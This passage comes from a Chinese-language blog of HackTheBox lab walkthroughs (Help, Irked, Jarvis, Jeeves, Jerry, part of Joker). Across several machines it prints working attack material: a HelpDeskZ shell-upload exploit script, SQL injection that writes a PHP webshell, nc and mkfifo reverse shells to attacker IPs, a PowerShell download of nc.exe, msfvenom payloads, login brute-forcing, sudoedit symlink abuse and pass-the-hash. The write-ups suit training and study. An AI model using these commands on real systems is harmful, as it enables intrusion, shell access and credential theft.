<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$filename &#x3D; md5($_FILES[&#39;attachment&#39;][&#39;name&#39;].time())...$ext;</span><br></pre></td></tr></table></figure>

<p>但是这个处理相当于把系统时间作为盐进行md5后作为文件名，我们可以暴力猜解来找到shell的位置</p>
<p>首先上传文件，位置在<code>Submit a Ticket</code>，上传之后返回<code>File is not allowed</code>，这里不需要管它，文件还是上传成功了</p>
<p><img src="/images/Help/6.png" alt="6"></p>
<p>查看python脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">print &#39;Helpdeskz v1.0.2 - Unauthenticated shell upload exploit&#39;</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &lt; 3:</span><br><span class="line">    print &quot;Usage &#123;&#125; [baseUrl] [nameOfUploadedFile]&quot;.format(sys.argv[0])</span><br><span class="line">    sys.exit(1)</span><br><span class="line"></span><br><span class="line">helpdeskzBaseUrl &#x3D; sys.argv[1]</span><br><span class="line">fileName &#x3D; sys.argv[2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(helpdeskzBaseUrl)</span><br><span class="line"></span><br><span class="line">#Gets the current time of the server to prevent timezone errors - DoctorEww</span><br><span class="line">currentTime &#x3D; int((datetime.datetime.strptime(r.headers[&#39;date&#39;], &#39;%a, %d %b %Y %H:%M:%S %Z&#39;)  - datetime.datetime(1970,1,1)).total_seconds())</span><br><span class="line"></span><br><span class="line">for x in range(0, 300):</span><br><span class="line">    plaintext &#x3D; fileName + str(currentTime - x)</span><br><span class="line">    md5hash &#x3D; hashlib.md5(plaintext).hexdigest()</span><br><span class="line"></span><br><span class="line">    url &#x3D; helpdeskzBaseUrl+md5hash+&#39;.php&#39;</span><br><span class="line">    response &#x3D; requests.head(url)</span><br><span class="line">    if response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        print &#39;found!&#39;</span><br><span class="line">        print url</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">print &#39;Sorry, I did not find anything&#39;</span><br></pre></td></tr></table></figure>

<p>它需要我们传递一个文件上传后的目录，幸好这个软件处于开源，我们查看源码可以猜到上传后的目录位于<code>http://10.10.10.121/support/uploads/tickets/</code></p>
<p>而且我认为该目录是存在的，因为假设我访问一个不存在的目录，返回404</p>
<p><img src="/images/Help/7.png" alt="7"></p>
<p>但当我访问这个目录的时候，返回302到默认页。可以猜测目录是存在的</p>
<p>而且从Date里可以得到服务器的时区和时间</p>
<p><img src="/images/Help/8.png" alt="8"></p>
<p>从python脚本来看，它会转换HTTP相应里的Date格式变成PHP的time()，也就是数字，然后寻找之后300秒作为盐的文件名</p>
<p><img src="/images/Help/9.png" alt="9"></p>
<p>所以为了快速找到shell，我们重新上传shell，并立即运行脚本，这样可以几乎瞬间找到shell的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 40300.py http:&#x2F;&#x2F;10.10.10.121&#x2F;support&#x2F;uploads&#x2F;tickets&#x2F; shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/10.png" alt="10"></p>
<p>这样就能获得shell</p>
<p><img src="/images/Help/11.png" alt="11"></p>
<h2 id="方法2-GraphQL"><a href="#方法2-GraphQL" class="headerlink" title="方法2 GraphQL"></a>方法2 GraphQL</h2><p>访问3000端口，通过关键词query和Express架构，指引我到GraphQL</p>
<p><img src="/images/Help/12.png" alt="12"></p>
<p>当我访问<code>http://10.10.10.121:3000/graphql</code></p>
<p><img src="/images/Help/13.png" alt="13"></p>
<p>在HackTrick上扎到了查询的方法:<a href="https://book.hacktricks.xyz/pentesting/pentesting-web/graphql">链接</a></p>
<p>找到了一篇<a href="https://www.apollographql.com/blog/graphql/examples/4-simple-ways-to-call-a-graphql-api/">文章</a>，可以使用curl来完成查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.121:3000&#x2F;graphql?query&#x3D;&#123;__schema&#123;types&#123;name,fields&#123;name,%20args&#123;name,description,type&#123;name,%20kind,%20ofType&#123;name,%20kind&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/14.png" alt="14"></p>
<p>之后就开始使用curl配合jq，让输出更美观</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s 10.10.10.121:3000&#x2F;graphql -H &quot;Content-Type: application&#x2F;json&quot; -d &#39;&#123; &quot;query&quot;: &quot;&#123; __schema &#123; types &#123; name &#125; &#125; &#125;&quot; &#125;&#39; | jq .</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/15.png" alt="15"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s 10.10.10.121:3000&#x2F;graphql -H &quot;Content-Type: application&#x2F;json&quot; -d &#39;&#123; &quot;query&quot;: &quot;&#123; __type(name: \&quot;User\&quot;) &#123; name fields &#123; name &#125; &#125; &#125;&quot; &#125;&#39; | jq .</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/16.png" alt="16"></p>
<p>最后这里注意大小写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s 10.10.10.121:3000&#x2F;graphql -H &quot;Content-Type: application&#x2F;json&quot; -d &#39;&#123; &quot;query&quot;: &quot;&#123; user &#123; username password &#125; &#125;&quot; &#125;&#39; | jq .</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/17.png" alt="17"></p>
<p>对哈希进行破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --format&#x3D;raw-md5</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/18.png" alt="18"></p>
<p>得到凭据<code>helpme@helpme.com/godhelpmeplz</code></p>
<p>这样就可以登陆HelpDeskZ了</p>
<p><img src="/images/Help/19.png" alt="19"></p>
<p>根据<code>41200.py</code>，可一知道sql注入在提交ticket中添加图片附件，接着打开ticket中的图片附件</p>
<p><img src="/images/Help/20.png" alt="20"></p>
<p>抓取请求包，可以发现，这里会受到布尔盲注的影响</p>
<p><img src="/images/Help/21.png" alt="21"></p>
<p>使用sqlmap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sqli -p &quot;param[]&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/22.png" alt="22"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sqli -p &quot;param[]&quot; --technique&#x3D;B --threads&#x3D;10 -D &quot;support&quot; -T &quot;staff&quot; --dump</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/23.png" alt="23"></p>
<p>破解sha1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --format&#x3D;Raw-SHA1</span><br></pre></td></tr></table></figure>

<p>得到<code>Welcome1</code></p>
<p><img src="/images/Help/24.png" alt="24"></p>
<p>之后猜测对方用户名，比如机器名help，尝试ssh连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh help@10.10.10.121</span><br><span class="line">Welcome1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/25.png" alt="25"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>内核老旧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">help@help:~$ uname -a</span><br><span class="line">Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>

<p>尝试运行<code>linux-exploit-suggester.sh</code>，得到</p>
<p>CVE-2017-16995</p>
<p><img src="/images/Help/26.png" alt="26"></p>
<p>CVE-2017-5899</p>
<p><img src="/images/Help/27.png" alt="27"></p>
<p>CVE-2017-16995的利用如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit -m 44298.c</span><br></pre></td></tr></table></figure>

<p>传输到目标上，然后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc exploit.c -o exploit</span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/28.png" alt="28"></p>
<p>CVE-2017-5899的利用如下:<a href="https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh">脚本链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;exp.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/29.png" alt="29"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Irked</title>
    <url>/2020/06/26/HTB-Irked/</url>
    <content><![CDATA[<h1 id="Irked"><a href="#Irked" class="headerlink" title="Irked"></a>Irked</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Irked/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>发现目标安装了IRC，这是一个在线聊天室软件，我们对它的版本进行检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">irssi -c 10.10.10.117 --port 8067</span><br></pre></td></tr></table></figure>

<p><img src="/images/Irked/2.jpg" alt="2"></p>
<p>发现软件版本</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞</p>
<p><img src="/images/Irked/4.jpg" alt="4"></p>
<p>修改13853.pl的payload，但死活用不了<br>找到了一个python3的exp，<a href="https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/master/exploit.py">链接</a></p>
<p>修改exp为我想用的reverse_shell</p>
<p><img src="/images/Irked/5.jpg" alt="5"></p>
<p>之后运行脚本即可</p>
<p><img src="/images/Irked/6.jpg" alt="6"></p>
<p>阅读代码后发现，直接用nc发一句话也可以获取shell，啥脚本也不要用</p>
<p><img src="/images/Irked/3.jpg" alt="3"></p>
<p>成功getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在目录里发现了备份文件</p>
<p><img src="/images/Irked/7.jpg" alt="7"></p>
<p>似乎保存了某样密码</p>
<p><img src="/images/Irked/8.jpg" alt="8"></p>
<p>可以用这个密码，解开80端口图片的隐写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss</span><br></pre></td></tr></table></figure>

<p><img src="/images/Irked/9.jpg" alt="9"></p>
<p>正好在机器里发现了其他用户，尝试ssh登录</p>
<p><img src="/images/Irked/10.jpg" alt="10"></p>
<p>成功登录</p>
<p><img src="/images/Irked/11.jpg" alt="11"></p>
<p>之后发现了某个SUID程序</p>
<p><img src="/images/Irked/12.jpg" alt="12"></p>
<p>进行文件传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64 -w0 viewuser</span><br></pre></td></tr></table></figure>

<p>复制到pass.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64 -d pass.txt &gt; viewuser</span><br><span class="line">chmod +x viewuser</span><br><span class="line">file viewuser</span><br><span class="line">ltrace .&#x2F;viewuser</span><br></pre></td></tr></table></figure>

<p><img src="/images/Irked/13.jpg" alt="13"></p>
<p>使用ltrace分析行为，我们可以发现这是一个可执行文件，并且会执行 /tmp/listusers</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>直接调用/usr/bin/viewuser就可以触发bash脚本</p>
<p><img src="/images/Irked/14.jpg" alt="14"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Jarvis</title>
    <url>/2020/06/29/HTB-Jarvis/</url>
    <content><![CDATA[<h1 id="Jarvis"><a href="#Jarvis" class="headerlink" title="Jarvis"></a>Jarvis</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Jarvis/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>先看那个高位http端口</p>
<p><img src="/images/Jarvis/2.jpg" alt="2"></p>
<p>看样子好像有一些防御设备的样子</p>
<p>80端口主页</p>
<p><img src="/images/Jarvis/3.jpg" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>在room.php的cod参数发现注入漏洞</p>
<p><img src="/images/Jarvis/4.jpg" alt="4"></p>
<p><img src="/images/Jarvis/5.jpg" alt="5"></p>
<p>确认存在注入</p>
<p>回显字段数为7</p>
<p><img src="/images/Jarvis/6.jpg" alt="6"></p>
<p>确认回显位置</p>
<p><img src="/images/Jarvis/7.jpg" alt="7"></p>
<p>发现current_user和system_user()一致，确认为DBA</p>
<p><img src="/images/Jarvis/8.jpg" alt="8"></p>
<p>尝试读取apache记录web路径的文件<code>/etc/apache2/sites-enabled/000-default.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.143&#x2F;room.php?cod&#x3D;0 union select%20 1,2,3,load_file(&#39;&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf&#39;),5,6,7#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Jarvis/12.jpg" alt="12"></p>
<p>发现路径为/var/www/html<br>写入webshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 union select &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;,2,3,4,5,6,7 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;evil.php&#39;#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Jarvis/9.jpg" alt="9"></p>
<p>反弹shell</p>
<p><img src="/images/Jarvis/10.jpg" alt="10"></p>
<p>成功反弹</p>
<p>顺便直接在反弹路径读到了mariaDB的连接信息</p>
<p><img src="/images/Jarvis/11.jpg" alt="11"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Jarvis/15.jpg" alt="15"></p>
<p>发现systemctl设置了suid，如果我们能找到个user权限的账号，提权就很方便了</p>
<p><img src="/images/Jarvis/13.jpg" alt="13"></p>
<p>发现能以pepper运行的py脚本，过去看看</p>
<p><img src="/images/Jarvis/14.jpg" alt="14"></p>
<p>看来它在执行系统命令ping，并限制了一些字符，但仍然存在缺陷</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u pepper &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py -p</span><br><span class="line">$(bash)</span><br></pre></td></tr></table></figure>

<p>利用美元符号直接逃逸</p>
<p><img src="/images/Jarvis/16.jpg" alt="16"></p>
<p>之后就可以使用systemctl进行提权了</p>
<p>参考GTFObins</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;pepper&#x2F;</span><br><span class="line">pepper@jarvis:~$ echo &#39;[Service]</span><br><span class="line">&gt; Type&#x3D;oneshot</span><br><span class="line">&gt; ExecStart&#x3D;&#x2F;bin&#x2F;sh -c &quot;nc 10.10.16.100 5555 -e &#x2F;bin&#x2F;bash&quot;</span><br><span class="line">&gt; [Install]</span><br><span class="line">&gt; WantedBy&#x3D;multi-user.target&#39; &gt; pwn.service</span><br><span class="line">systemctl link &#x2F;home&#x2F;pepper&#x2F;pwn.service </span><br><span class="line">systemctl start pwn.service </span><br></pre></td></tr></table></figure>

<p>创建服务类型oneshot<br>ExecStart放payload<br>link讲这个新建的服务连接到systemd<br>启动后就会执行命令</p>
<p><img src="/images/Jarvis/17.jpg" alt="17"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Jeeves</title>
    <url>/2020/07/01/HTB-Jeeves/</url>
    <content><![CDATA[<h1 id="Jeeves"><a href="#Jeeves" class="headerlink" title="Jeeves"></a>Jeeves</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Jeeves/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>对80和50000进行枚举，首页都没有价值的信息，进行目录枚举</p>
<p><img src="/images/Jeeves/2.jpg" alt="2"></p>
<p>在50000端口发现有意思的目录</p>
<p><img src="/images/Jeeves/7.jpg" alt="7"></p>
<p>发现jenkins 2.87</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p><img src="/images/Jeeves/3.jpg" alt="3"></p>
<p><img src="/images/Jeeves/4.jpg" alt="4"></p>
<p>插入执行的系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;nc.exe&#39;,&#39;%temp%\nc.exe&#39;)&quot;</span><br><span class="line">%temp%\nc.exe 10.10.16.98 4444 -e cmd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Jeeves/5.jpg" alt="5"></p>
<p>点击build now</p>
<p><img src="/images/Jeeves/6.jpg" alt="6"></p>
<p>成功getshell</p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p><img src="/images/Jeeves/8.jpg" alt="8"></p>
<p><img src="/images/Jeeves/9.jpg" alt="9"></p>
<p>之后会看到执行<code>groovy</code>命令的控制台，谷歌搜索<code>Groovy executing shell commands</code>你就会找到执行系统命令的方法</p>
<p><img src="/images/Jeeves/10.jpg" alt="10"></p>
<p>RCE成功，现在弹个shell回来</p>
<p><img src="/images/Jeeves/11.jpg" alt="11"></p>
<p>getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Jeeves/12.jpg" alt="12"></p>
<p>发现了CEH.kdbx这个文件，传递到kali</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy CEH.kdbx \\10.10.16.98\a\</span><br></pre></td></tr></table></figure>

<p>使用john解密keepass</p>
<p><img src="/images/Jeeves/13.jpg" alt="13"></p>
<p>得到密码moonshine1</p>
<p>安装keepass2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install keypass2</span><br></pre></td></tr></table></figure>

<p>之后打开keepass输入密码moonshine1</p>
<p><img src="/images/Jeeves/14.jpg" alt="14"></p>
<p>成功获取密码</p>
<p>使用pth-winexe传递hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pth-winexe -U Administrator &#x2F;&#x2F;10.10.10.63 &quot;cmd.exe&quot;</span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span><br></pre></td></tr></table></figure>

<p><img src="/images/Jeeves/15.jpg" alt="15"></p>
<p>最后读取root的时候，读取另外一个数据流</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;R</span><br><span class="line">powershell Get-Content -Path &quot;hm.txt&quot; -Stream &quot;root.txt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Jeeves/16.jpg" alt="16"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Jerry</title>
    <url>/2020/06/23/HTB-Jerry/</url>
    <content><![CDATA[<h1 id="Jerry"><a href="#Jerry" class="headerlink" title="Jerry"></a>Jerry</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Jerry/1.jpg" alt="1"></p>
<p>只发现了8080端口</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问8080，发现tomcat</p>
<p><img src="/images/Jerry/2.jpg" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="上传war"><a href="#上传war" class="headerlink" title="上传war"></a>上传war</h3><p>理想中的渗透方式为登录后台，上传evil.war，触发reverse_shell</p>
<p>尝试弱口令登录后台，<a href="https://github.com/govolution/betterdefaultpasslist">字典链接</a><br>爆破脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">with open(&quot;tomcat.txt&quot;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        c&#x3D;line.strip(&#39;\n&#39;).split(&quot;:&quot;)</span><br><span class="line">        r&#x3D;requests.get(&#39;http:&#x2F;&#x2F;10.10.10.95:8080&#x2F;manager&#x2F;html&#39;, auth&#x3D;(c[0], c[1]))</span><br><span class="line">        </span><br><span class="line">        if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            print &quot;Found valid credentials \&quot;&quot; + line.strip(&#39;\n&#39;) + &quot;\&quot;&quot;</span><br><span class="line">            raise sys.exit()</span><br></pre></td></tr></table></figure>

<p><img src="/images/Jerry/3.jpg" alt="3"></p>
<p>很快找出了账号密码<code>tomcat:s3cret</code></p>
<p>这里使用hydra也可以，只要选中合适的字典</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt -f -s 8080 10.10.10.95 http-get &#x2F;manager&#x2F;html</span><br></pre></td></tr></table></figure>

<p>制作war包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.16.99 LPORT&#x3D;4444 -f war -o evil.war</span><br></pre></td></tr></table></figure>

<p>上传触发，getshell</p>
<p><img src="/images/Jerry/4.jpg" alt="4"></p>
<p>直接为system</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Joker</title>
    <url>/2020/10/20/HTB-Joker/</url>
    <content><![CDATA[<h1 id="Joker"><a href="#Joker" class="headerlink" title="Joker"></a>Joker</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Joker/1.png" alt="1"></p>
<p>TCP扫描发现squid-http，一个http正向代理服务和ssh，这两个服务很难突破</p>
<p>尝试UDP扫描</p>
<p><img src="/images/Joker/2.png" alt="2"></p>
<p>发现了tftp</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>唯一突破点可能是tftp，尝试下载文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tftp&gt; get &#x2F;etc&#x2F;passwd</span><br><span class="line">Error code 2: Access violation</span><br></pre></td></tr></table></figure>

<p>看来不能做到任意文件下载，尝试下载一些铭感文件，比如squid的配置文件</p>
<p>通过google搜索，可以发现suqid.conf的位置</p>
<p><img src="/images/Joker/3.png" alt="3"></p>
<p>尝试下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get &#x2F;etc&#x2F;squid&#x2F;squid.conf</span><br></pre></td></tr></table></figure>

<p>之后可以发现凭据文件</p>
<p><img src="/images/Joker/4.png" alt="4"></p>
<p>尝试下载该文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get &#x2F;etc&#x2F;squid&#x2F;passwords</span><br></pre></td></tr></table></figure>

<p><img src="/images/Joker/5.png" alt="5"></p>
<p>得到</p>
<p><img src="/images/Joker/6.png" alt="6"></p>
<p>破解哈希</p>
<p><img src="/images/Joker/7.png" alt="7"></p>
<p>得到<code>kalamari/ihateseafood</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>配置使用对方的http代理</p>
<p><img src="/images/Joker/8.png" alt="8"></p>
<p>关闭本地apache2服务，访问<code>http://127.0.0.1</code>，注意Ctrl+F5清除本地缓存</p>
<p><img src="/images/Joker/9.png" alt="9"></p>
<p>得到了一个添加短网址页面</p>
<h3 id="流量操控"><a href="#流量操控" class="headerlink" title="流量操控"></a>流量操控</h3><p>我们需要对对方页面进行http枚举，需要进行流量操控技术，这里使用burp很方便</p>
<p>首先给burp使用http代理</p>
<p><img src="/images/Joker/10.png" alt="10"></p>
<p>接着添加监听8080和80端口，转发到本地80端口<br>虽然是转发到127.0.0.1端口，但流量应该为:访问本地80端口→经过burp的http proxy→到达对方本地80端口</p>
<p><img src="/images/Joker/11.png" alt="11"></p>
<p>这样添加了8080端口转发，我们就可以不用在浏览器上使用http代理，可以直接使用burp最为代理，可以正常进行抓包。<br>添加80端口转发，可以使用工具进行枚举，比如curl</p>
<p>burp能抓到包，并且正常返回对方的请求</p>
<p><img src="/images/Joker/12.png" alt="12"></p>
<p>这样就可以正常进行枚举http枚举了</p>
<p><img src="/images/Joker/13.png" alt="13"></p>
<p>发现<code>console</code></p>
<p><img src="/images/Joker/14.png" alt="14"></p>
<p>一个python shell页面，而且可以执行系统命令，但尝试了很多反弹shell，都不行</p>
<p>考虑防火墙等因素，尝试ping</p>
<p><img src="/images/Joker/15.png" alt="15"></p>
<p>成功捕获，看来有一些阻碍，尝试查看对方iptables设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;etc |grep iptables</span><br></pre></td></tr></table></figure>

<p><img src="/images/Joker/17.png" alt="17"></p>
<p>发现<code>/etc/iptables/rules.v4</code>，进行读取</p>
<p><img src="/images/Joker/16.png" alt="16"></p>
<p>看来没有可以反向shell的端口可以使用了，尝试使用UDP shell</p>
<p>payload，注意u参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">os.popen(&#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc -u 10.10.16.98 4444 &gt;&#x2F;tmp&#x2F;f&#39;).read()</span><br></pre></td></tr></table></figure>

<p>接受也要u参数，就能获取shell了</p>
<p><img src="/images/Joker/18.png" alt="18"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>由于禁止了tcp，所以文件传输有些麻烦，只能手动收集信息</p>
<p><img src="/images/Joker/19.png" alt="19"></p>
<p>查看sudo权限时，发现了一些奇怪的东西，之后方法来自IppSec</p>
<h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><h4 id="方法1-软连接"><a href="#方法1-软连接" class="headerlink" title="方法1 软连接"></a>方法1 软连接</h4><p>先移动到sudo需要的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;testing&#x2F;test</span><br></pre></td></tr></table></figure>

<p>创建软连接，目标为用户的authorized_keys</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;home&#x2F;alekos&#x2F;.ssh&#x2F;authorized_keys layout.html</span><br></pre></td></tr></table></figure>

<p>接着以sudo编辑layout.html</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudoedit -u alekos &#x2F;var&#x2F;www&#x2F;testing&#x2F;test&#x2F;layout.html</span><br></pre></td></tr></table></figure>

<p>写入公钥</p>
<p><img src="/images/Joker/20.png" alt="20"></p>
<p>接着就能私钥连接过去了</p>
<p><img src="/images/Joker/21.png" alt="21"></p>
<h4 id="方法2-利用空格"><a href="#方法2-利用空格" class="headerlink" title="方法2 利用空格"></a>方法2 利用空格</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;alekos			首先需要前提，能够进入alekos的主目录</span><br><span class="line">sudoedit -u alekos &#x2F;var&#x2F;www&#x2F; .ssh&#x2F;authorized_keys &#x2F;layout.html</span><br></pre></td></tr></table></figure>

<p>使用空格，满足sudo的路径要求，而sudoedit会把空格理解成编辑2个文件(第一个参数没指定文件)，就能顺利编辑相对路径<code>.ssh/authorized_keys</code>和绝对路径<code>/layout.html</code>了，也是可以写入公钥</p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>需要一些推测</p>
<p><img src="/images/Joker/22.png" alt="22"></p>
<p>在home目录下的backup里，发现一些.tar.gz压缩包，尝试解压</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar xvf dev-1603181401.tar.gz</span><br></pre></td></tr></table></figure>

<p>之后发现里面的文件似乎是home目录下的development的文件，而且从拥有者看，这个计划任务的执行者是root<br>而它有可能每5分钟执行一个这样的命令</p>
